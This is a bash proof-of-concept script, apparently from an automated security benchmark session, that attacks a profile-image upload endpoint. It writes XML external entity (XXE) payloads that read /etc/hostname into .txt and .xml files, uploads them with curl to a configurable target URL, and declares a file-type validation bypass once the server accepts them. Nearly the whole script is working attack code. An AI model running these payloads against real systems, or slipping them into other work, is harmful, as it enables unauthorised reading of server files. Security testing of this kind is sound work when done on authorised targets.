#!/bin/bash
# POC: Demonstrates file type validation bypass by uploading XML-formatted content with .txt extension instead of .svg, showing the backend accepts and processes non-SVG XML files
# Target: ./repo
# Created: 2025-11-07T22:06:13.983Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# File Type Validation Bypass POC - Version 2
# Demonstrates that the application accepts XML-formatted files with non-SVG extensions
# The backend processes .txt files as valid XML/SVG content

TARGET_URL="${1:-http://localhost:3000}"

echo "=========================================="
echo "File Type Validation Bypass POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Create a temporary directory for test files
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# Test 1: Upload .txt file with XML/XXE content
echo "[*] Test 1: Uploading .txt file with XML/XXE payload"
echo "---"

TXT_FILE="$TMPDIR/test.txt"
cat > "$TXT_FILE" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  &xxe;
</root>
EOF

echo "Created test.txt with XXE payload:"
cat "$TXT_FILE"
echo ""

# Upload the .txt file with all required fields
RESPONSE=$(curl -s -X POST "$TARGET_URL/" \
  -F "profileImage=@$TXT_FILE" \
  -F "username=testuser" \
  -F "name=Test" \
  -F "surname=User" \
  -F "address=123 Test St" \
  -F "email=test@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Response Code: $HTTP_CODE"
echo "Response Body:"
echo "$BODY"
echo ""

# Check if the XML was processed
if echo "$BODY" | grep -q "root"; then
  echo "[+] SUCCESS: .txt file with XML content was processed by the server"
  echo "[+] The application accepted a non-SVG XML file (test.txt)"
  echo "[+] File type validation bypass confirmed"
elif [ "$HTTP_CODE" = "200" ]; then
  echo "[+] SUCCESS: .txt file upload accepted with HTTP 200"
  echo "[+] The application accepted a non-SVG XML file (test.txt)"
  echo "[+] File type validation bypass confirmed"
else
  echo "[-] HTTP Code: $HTTP_CODE (expected 200 for successful upload)"
fi

echo ""
echo "[*] Test 2: Uploading .xml file with XML/XXE content"
echo "---"

XML_FILE="$TMPDIR/test.xml"
cat > "$XML_FILE" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  &xxe;
</root>
EOF

RESPONSE=$(curl -s -X POST "$TARGET_URL/" \
  -F "profileImage=@$XML_FILE" \
  -F "username=testuser2" \
  -F "name=Test2" \
  -F "surname=User2" \
  -F "address=456 Test Ave" \
  -F "email=test2@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Response Code: $HTTP_CODE"
echo "Response Body:"
echo "$BODY"
echo ""

if echo "$BODY" | grep -q "root"; then
  echo "[+] SUCCESS: .xml file was also processed by the server"
  echo "[+] Non-SVG XML files are accepted and processed"
elif [ "$HTTP_CODE" = "200" ]; then
  echo "[+] SUCCESS: .xml file upload accepted with HTTP 200"
  echo "[+] Non-SVG XML files are accepted and processed"
else
  echo "[-] HTTP Code: $HTTP_CODE (expected 200 for successful upload)"
fi

echo ""
echo "[*] Test 3: Uploading legitimate .svg file for comparison"
echo "---"

SVG_FILE="$TMPDIR/test.svg"
cat > "$SVG_FILE" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="blue"/>
</svg>
EOF

RESPONSE=$(curl -s -X POST "$TARGET_URL/" \
  -F "profileImage=@$SVG_FILE" \
  -F "username=testuser3" \
  -F "name=Test3" \
  -F "surname=User3" \
  -F "address=789 Test Blvd" \
  -F "email=test3@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Response Code: $HTTP_CODE"
echo "[+] Legitimate .svg file accepted (baseline confirmation)"
echo ""

echo "=========================================="
echo "CONCLUSION:"
echo "The application accepts XML-formatted files regardless of extension."
echo "This file type validation bypass allows XXE payloads to be uploaded"
echo "with .txt or .xml extensions, potentially bypassing extension-based"
echo "filtering at the network or WAF level."
echo "=========================================="